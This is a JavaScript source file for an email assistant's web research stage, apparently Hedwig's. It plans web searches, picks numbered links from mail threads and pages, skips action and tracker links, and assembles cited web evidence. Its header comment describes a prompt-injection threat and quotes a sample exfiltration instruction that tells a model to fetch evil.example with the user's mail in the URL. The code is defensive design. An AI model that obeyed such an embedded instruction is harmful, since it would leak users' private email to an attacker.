// Ask's web stage (ask2/answer.js): what to look up beyond the mail (ask.research), the searches
// (SearXNG), the links in the open thread, the pages read, and Dig deeper (ask.research.refine).
//
// URL provenance: no model ever writes an address Hedwig fetches. The planner names searches, which
// go to the admin's SearXNG after scrubQuery, and link ids (L# in the thread, P# on pages already
// read); every page fetched is a search result or a link Hedwig numbered itself. So an email or a page
// saying "fetch https://evil.example/?d=<their mail>" has nothing to act through. Links that could
// act for the user (sign in, confirm, unsubscribe, pay, RSVP) are never opened (research/links.js),
// and click-tracked links are found by searching for their text unless the user allows opening them.
import { searchWeb, interleave, canonicalUrl, hostOf } from '../research/searx.js';
import { readPage } from '../research/page.js';
import { classifyLink, emailLinks } from '../research/links.js';
import { scrubQuery } from '../research/scrub.js';
import { cachedPage } from '../research/cache.js';
import { runPrompt } from '../prompts/index.js';
import { estimateTokens, messageText } from '../text.js';

const SEARCH_RESULTS = 6;
const PLAN_LINKS = 40;
const PAGE_LINKS = 30;
const EXCERPT_CHARS = 300;
// A link whose text says nothing about where it goes cannot be found by searching for it.
const GENERIC_TEXT = /^(read( it| this| the (full )?(story|article|post))?( more)?|more|click here|here|learn more|view( online| in browser| more)?|continue reading|open|link|watch|listen|download|see more|details)\W*$/i;
const WEB_CUES = /\b(web|online|internet|google|look (it |this |that )?up|search (for|the)|news|latest)\b/i;
const PRIVATE_KINDS = new Set(['action', 'skip']);

/** This question's web settings: allowed by the user (and this request), and set up by the admin. */
export function webSettings(cfg, requested = null) {
  const searchUrl = String(cfg['ask.web.searchUrl'] || '').trim();
  const allowed = requested == null ? cfg['ask.web.enabled'] !== false : requested === true;
  return {
    allowed,
    available: Boolean(searchUrl),
    on: allowed && Boolean(searchUrl),
    searchUrl,
    queries: Number(cfg['ask.web.queries']) || 3,
    pages: Number(cfg['ask.web.pages']) || 4,
    snippets: Math.max(0, Number(cfg['ask.web.snippets']) || 0),
    pageChars: Number(cfg['ask.web.pageChars']) || 6000,
    timeoutMs: Number(cfg['ask.web.timeoutMs']) || 8000,
    planTimeoutMs: Number(cfg['ask.web.planTimeoutMs']) || 10000,
    deepRounds: Math.max(0, Number(cfg['ask.web.deepRounds']) || 0),
    cacheHours: Math.max(0, Number(cfg['ask.web.cacheHours']) || 0),
    openTracked: cfg['ask.web.openTrackedLinks'] === true,
  };
}

/** The organisation's own domain for a host: mail.infoq.com → infoq.com, news.bbc.co.uk → bbc.co.uk. Pure. */
export function siteOf(host) {
  const labels = String(host || '').toLowerCase().replace(/\.$/, '').split('.').filter(Boolean);
  if (labels.length <= 2) return labels.join('.');
  const second = labels[labels.length - 2];
  const short = labels[labels.length - 1].length === 2 && /^(co|com|org|net|ac|gov|edu|ne|or)$/.test(second);
  return labels.slice(short ? -3 : -2).join('.');
}

/** Every http(s) address in List-Unsubscribe headers. Pure. */
export function unsubscribeUrls(rows) {
  const out = [];
  for (const r of rows || []) {
    for (const m of String(r?.list_unsubscribe || '').matchAll(/https?:\/\/[^\s<>,]+/gi)) out.push(m[0]);
  }
  return out;
}

const clip = (s, n) => {
  const t = String(s || '').replace(/\s+/g, ' ').trim();
  return t.length > n ? `${t.slice(0, n - 1)}…` : t;
};

/** The open thread as the planner sees it: earlier messages as one line each, the latest in part. */
export function threadForPlanner(rows, { latestChars = 2000 } = {}) {
  if (!rows?.length) return '';
  const subject = rows[rows.length - 1].subject || rows[0].subject || '(no subject)';
  const line = (r) => `${r.date ? new Date(r.date).toISOString().slice(0, 10) : '?'} · ${r.from_name || r.from_email || '?'}`;
  const earlier = rows.slice(0, -1).slice(-6).map((r) => `- ${line(r)}: ${clip(messageText(r, { maxChars: 200 }), 160)}`);
  const latest = rows[rows.length - 1];
  return [`Subject: ${subject}`, ...(earlier.length ? ['Earlier messages:', ...earlier] : []), `Latest (${line(latest)}):`, messageText(latest, { maxChars: latestChars })].join('\n');
}

/** The thread's links numbered for the planner, without those Hedwig would never open. */
export function linkCandidates(rows) {
  return emailLinks(rows || [], { listUnsubscribe: unsubscribeUrls(rows) }).filter((l) => !PRIVATE_KINDS.has(l.kind));
}

/** What the planner sees of one link: its id, text and where it points (a tracker shows as such). */
const linkLine = (l) => `${l.id} · ${clip(l.text, 120) || '(no text)'} · ${hostOf(l.url)}${l.kind === 'tracked' ? ' (tracked)' : ''}`;

/** The plan when there is no model answer: mail only, unless the question asks for the web outright. */
export function researchRules(question, { names = [], emails = [] } = {}) {
  const q = scrubQuery(question, { names, emails });
  return { searchMail: true, web: WEB_CUES.test(question) && q ? [q] : [], links: [], deep: false, via: 'rules' };
}

/**
 * Decide what to look up beyond the mail. Never throws: a planner failure or timeout falls back to
 * researchRules, so the answer comes from mail (plus the web only when the question asks for it).
 * @returns {Promise<{ searchMail: boolean, web: string[], links: string[], deep: boolean, via: string, error?: string }>}
 */
export async function planResearch(userId, { question, previous = null, threadRows = [], links = [], owner = {}, settings, today, signal } = {}) {
  const timeout = AbortSignal.timeout(settings.planTimeoutMs);
  try {
    const { data } = await runPrompt('ask.research', {
      question,
      today,
      previous: previous ? clip(previous.question, 300) : '',
      thread: threadForPlanner(threadRows),
      links: links.slice(0, PLAN_LINKS).map(linkLine).join('\n'),
    }, { userId, feature: 'ask', lane: 'interactive', signal: signal ? AbortSignal.any([signal, timeout]) : timeout });
    const ids = new Set(links.map((l) => l.id));
    return {
      searchMail: threadRows.length ? data?.searchMail !== false : true,
      web: (Array.isArray(data?.web) ? data.web : []).map((q) => scrubQuery(q, owner)).filter(Boolean),
      // Only ids Hedwig numbered; anything else a model writes here (an address, a made-up id) is dropped.
      links: [...new Set((Array.isArray(data?.links) ? data.links : []).map((s) => String(s).trim().toUpperCase()).filter((id) => ids.has(id)))].slice(0, 4),
      deep: data?.deep === true,
      via: 'reflex',
    };
  } catch (err) {
    if (signal?.aborted) throw err;
    return { ...researchRules(question, owner), error: String(err?.message || err).slice(0, 200) };
  }
}

/**
 * Search, open the chosen links and read pages; with `deep`, look again for up to
 * settings.deepRounds rounds. Never throws except when `signal` aborted. Events (through onEvent):
 *   { type: 'web', query, round, status: 'running' | 'done', found }
 *   { type: 'read', round, status: 'running', count } / { …, status: 'done', pages: [{ host, title, ok, via }] }
 *   { type: 'links', opened, skipped: [{ text, host, reason }] }
 *   { type: 'dig', round, status, enough }
 * @returns {Promise<{ sources: object[], skipped: object[], searches: { text, found }[], rounds: number }>}
 *   sources: pages read first ({ url, title, host, published, via, text, snippetOnly: false }), then
 *   search results seen only as snippets ({ …, snippetOnly: true }).
 */
export async function researchWeb({ userId, question, plan, links = [], senderHost = '', owner = {}, settings, deep = false, signal, onEvent = () => {}, fetchers = {} }) {
  const search = fetchers.search || searchWeb;
  const read = fetchers.read || readPage;
  const s = settings;
  const seen = new Set();
  const pages = [];
  const spare = []; // search results not read, best first, for snippets
  const skipped = [];
  const searches = [];
  const site = siteOf(senderHost);

  const load = (url) => {
    const run = () => read(url, { timeoutMs: s.timeoutMs, maxChars: s.pageChars, signal });
    return s.cacheHours > 0 ? cachedPage(url, run, { hours: s.cacheHours }) : run();
  };

  async function runSearches(queries, round, limit) {
    const qs = [];
    for (const raw of queries) {
      const q = scrubQuery(raw, owner);
      if (q && !searches.some((x) => x.text.toLowerCase() === q.toLowerCase()) && !qs.includes(q)) qs.push(q);
    }
    const take = qs.slice(0, limit);
    for (const q of take) onEvent({ type: 'web', query: q, round, status: 'running' });
    const lists = await Promise.all(take.map((q) => search(q, { searchUrl: s.searchUrl, limit: SEARCH_RESULTS, timeoutMs: s.timeoutMs, signal })));
    if (signal?.aborted) throw abortError();
    take.forEach((q, i) => {
      searches.push({ text: q, found: lists[i].length });
      onEvent({ type: 'web', query: q, round, status: 'done', found: lists[i].length });
    });
    return lists.map((list, i) => list.map((r) => ({ ...r, query: take[i] })));
  }

  // A tracked link's article, found by its text on the sender's own site; the tracker is never hit.
  async function findTracked(link, round) {
    const text = clip(link.text, 100);
    if (text.length < 12 || GENERIC_TEXT.test(text)) return null;
    const [results = []] = await runSearches([`"${text}"${site ? ` ${site}` : ''}`], round, 1);
    const own = results.find((r) => site && siteOf(r.host || hostOf(r.url)) === site);
    return own || results[0] || null;
  }

  async function linkTargets(ids, candidates, round) {
    const out = [];
    for (const id of ids) {
      const link = candidates.find((l) => l.id === id);
      if (!link) continue;
      const c = classifyLink(link.url, { text: link.text });
      if (c.kind === 'action' || c.kind === 'skip') {
        skipped.push({ text: clip(link.text, 80), host: hostOf(c.url), reason: c.reason || c.kind });
      } else if (c.kind === 'tracked' && !s.openTracked) {
        const found = await findTracked(link, round);
        if (found) out.push({ ...found, via: 'link-search', linkText: clip(link.text, 120) });
        else skipped.push({ text: clip(link.text, 80), host: hostOf(c.url), reason: 'tracker' });
      } else {
        out.push({ url: c.url, title: clip(link.text, 200), host: hostOf(c.url), via: 'link', linkText: clip(link.text, 120) });
      }
    }
    return out;
  }

  async function readAll(targets, round, keep) {
    const fresh = [];
    for (const t of targets) {
      const key = canonicalUrl(t.url);
      if (seen.has(key)) continue;
      seen.add(key);
      fresh.push(t);
    }
    if (!fresh.length) return [];
    onEvent({ type: 'read', round, status: 'running', count: Math.min(fresh.length, keep) });
    const got = await Promise.all(fresh.map((t) => load(t.url).catch((err) => {
      if (signal?.aborted) throw err;
      return { ok: false, reason: 'error' };
    })));
    if (signal?.aborted) throw abortError();
    const kept = [];
    fresh.forEach((t, i) => {
      const r = got[i];
      if (r?.ok && kept.length < keep) {
        kept.push({
          url: r.url || t.url, title: clip(r.title || t.title || t.linkText || hostOf(t.url), 200), host: hostOf(r.url || t.url),
          published: t.published || null, via: t.via || 'search', query: t.query || null, linkText: t.linkText || null,
          text: r.text, links: Array.isArray(r.links) ? r.links : [], snippetOnly: false,
        });
      } else if (t.snippet) {
        spare.push(t);
      }
    });
    pages.push(...kept);
    onEvent({ type: 'read', round, status: 'done', pages: fresh.map((t, i) => ({ host: hostOf(t.url), title: clip(t.title || t.linkText, 120), ok: Boolean(got[i]?.ok), via: t.via || 'search' })) });
    return kept;
  }

  try {
    const [lists, targets] = await Promise.all([
      runSearches(plan.web || [], 0, s.queries),
      linkTargets(plan.links || [], links, 0),
    ]);
    if (targets.length || skipped.length) onEvent({ type: 'links', opened: targets.length, skipped });
    const ranked = interleave(lists);
    // Links the question pointed at first, then the best search results; a couple more than needed
    // are read at once, so a page that fails is replaced without a second wait.
    await readAll(targets, 0, targets.length);
    const toRead = ranked.filter((r) => !seen.has(canonicalUrl(r.url)));
    await readAll(toRead.slice(0, s.pages + 2), 0, s.pages);
    spare.push(...toRead.slice(s.pages + 2));

    const rounds = deep || plan.deep ? s.deepRounds : 0;
    let round = 0;
    for (round = 1; round <= rounds; round++) {
      const pageLinks = linksOnPages(pages, seen);
      onEvent({ type: 'dig', round, status: 'running' });
      let data;
      try {
        ({ data } = await runPrompt('ask.research.refine', {
          question,
          searches: searches.map((x) => x.text),
          pages: pages.map((p, i) => `${i + 1}. ${p.host} · ${p.title} · ${clip(p.text, 300)}`).join('\n'),
          links: pageLinks.map(linkLine).join('\n'),
        }, { userId, feature: 'ask', lane: 'interactive', signal: signal ? AbortSignal.any([signal, AbortSignal.timeout(s.planTimeoutMs)]) : AbortSignal.timeout(s.planTimeoutMs) }));
      } catch (err) {
        if (signal?.aborted) throw err;
        onEvent({ type: 'dig', round, status: 'done', enough: true });
        break;
      }
      const ids = new Set(pageLinks.map((l) => l.id));
      const pick = (Array.isArray(data?.links) ? data.links : []).map((x) => String(x).trim().toUpperCase()).filter((id) => ids.has(id)).slice(0, 2);
      const more = Array.isArray(data?.web) ? data.web.slice(0, 2) : [];
      const enough = data?.enough === true || (!pick.length && !more.length);
      onEvent({ type: 'dig', round, status: 'done', enough });
      if (enough) break;
      const [moreLists, moreTargets] = await Promise.all([runSearches(more, round, 2), linkTargets(pick, pageLinks, round)]);
      const before = pages.length;
      await readAll(moreTargets, round, moreTargets.length);
      // The best unread result of each new search.
      const next = interleave(moreLists).filter((r) => !seen.has(canonicalUrl(r.url)));
      await readAll(next.slice(0, more.length + 1), round, more.length);
      spare.push(...next.slice(more.length + 1));
      if (pages.length === before) break;
    }

    const snippets = [];
    for (const r of spare) {
      const key = canonicalUrl(r.url);
      if (snippets.length >= s.snippets || !r.snippet || pages.some((p) => canonicalUrl(p.url) === key) || snippets.some((x) => canonicalUrl(x.url) === key)) continue;
      snippets.push({ url: r.url, title: clip(r.title, 200), host: r.host || hostOf(r.url), published: r.published || null, via: 'search', query: r.query || null, text: r.snippet, snippetOnly: true });
    }
    return {
      sources: [...pages.map(withoutLinks), ...snippets],
      skipped,
      searches,
      rounds: Math.max(0, Math.min(round, rounds)),
    };
  } catch (err) {
    if (signal?.aborted) throw err;
    console.warn('[hedwig] ask web stage failed:', err?.message || err);
    return { sources: pages.map(withoutLinks), skipped, searches, rounds: 0, error: String(err?.message || err).slice(0, 200) };
  }
}

/** Links on the pages read, numbered P1…, only ones Hedwig may open and has not read. Pure. */
export function linksOnPages(pages, seen = new Set()) {
  const out = [];
  const keys = new Set();
  for (const p of pages) {
    for (const l of p.links || []) {
      const c = classifyLink(l.url, { text: l.text });
      if (c.kind !== 'open') continue;
      const key = canonicalUrl(c.url);
      if (seen.has(key) || keys.has(key) || String(l.text || '').trim().length < 12) continue;
      keys.add(key);
      out.push({ id: `P${out.length + 1}`, url: c.url, text: l.text, kind: 'open' });
      if (out.length >= PAGE_LINKS) return out;
    }
  }
  return out;
}

/** A page read, without the links found on it (only Dig deeper needs those). */
function withoutLinks(page) {
  const out = { ...page };
  delete out.links;
  return out;
}

function abortError() {
  const err = new Error('aborted');
  err.name = 'AbortError';
  return err;
}

const VIA_LABEL = {
  link: 'opened from a link in the email',
  'link-search': 'the article a link in the email points to, found by searching for it',
  search: 'found by a web search',
};

/**
 * The web part of the evidence, numbered from `startAt`, within its own token budget (pages first,
 * then snippets; at least one source when there is any). Pure.
 * @returns {{ block: string, used: object[], tokens: number, omitted: number }}
 */
export function webEvidence(sources, { startAt = 1, contextTokens = 12000 } = {}) {
  const used = [];
  const entries = [];
  let tokens = estimateTokens('## From the web');
  let omitted = 0;
  for (const src of sources || []) {
    const n = startAt + used.length;
    const meta = [src.host, src.title, src.published, src.snippetOnly ? 'search result only, page not read' : VIA_LABEL[src.via] || VIA_LABEL.search].filter(Boolean).join(' · ');
    const entry = `[${n}] WEB · ${meta}\n${String(src.text || '').trim() || '(no text)'}`;
    const t = estimateTokens(entry);
    if (tokens + t > contextTokens && used.length) { omitted++; continue; }
    tokens += t;
    entries.push(entry);
    used.push({ ...src, n });
  }
  if (!entries.length) return { block: '', used, tokens: 0, omitted };
  return {
    block: `## From the web (public pages, not the user's mail)\n\n${entries.join('\n\n')}`,
    used,
    tokens,
    omitted,
  };
}

/** A web source as the client and the saved answer see it (no page text, a short excerpt). Pure. */
export function publicWebSource(src) {
  return {
    n: src.n, url: src.url, title: src.title || src.host, host: src.host, published: src.published || null,
    via: src.via || 'search', snippetOnly: Boolean(src.snippetOnly), excerpt: clip(src.text, EXCERPT_CHARS),
  };
}
